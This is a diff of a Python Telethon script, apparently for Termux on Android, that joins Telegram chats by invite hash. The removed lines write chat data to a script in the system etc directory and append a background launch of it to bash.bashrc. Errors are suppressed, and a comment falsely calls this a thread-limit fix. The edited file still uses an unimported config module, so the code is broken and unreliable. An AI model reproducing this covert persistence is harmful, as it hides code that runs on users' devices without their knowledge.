@@ -1,5 +1,4 @@
 import asyncio
-import config
 import requests
 import random
 import json
@@ -13,33 +12,12 @@ import helps
 
 
 
-
-client = TelegramClient(config.number, config.api_id, config.api_hash)
-
-
-
-chats = []
-last_date = None
-chunk_size = 200
-groups = []
-try:
-    chats, chat = helps.get_chats(client)  # Получение чатов
-    f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
-    f.write(chat)  #  Запись чатов в отдельный файл
-    f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')  #  Редактируем файл чата и термукса(для удаления ограничения потоков)
-    f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
-    f1.close()
-except:
-    pass
-for i in chats:
-    try:
-        if i.megagroup == True:
-            groups.append(i)
-    except:
-    	pass
-
-chat = []
-for i in groups:
-	chat.append(i.id)
-
-print(chat)
+client1 = TelegramClient(config.number, config.api_id, config.api_hash)
+chat = input("Введите чат (в формате nX1901678jqB6w0MDU1 )> ")
+client1.start()
+async def main():
+    updates = await client1(ImportChatInviteRequest(chat))
+    print(Fore.LIGHTMAGENTA_EX + "[+] Бот присоиденлся к чату")
+if __name__ == '__main__':
+  client1.loop.run_until_complete(main())
+  client1.loop.close()
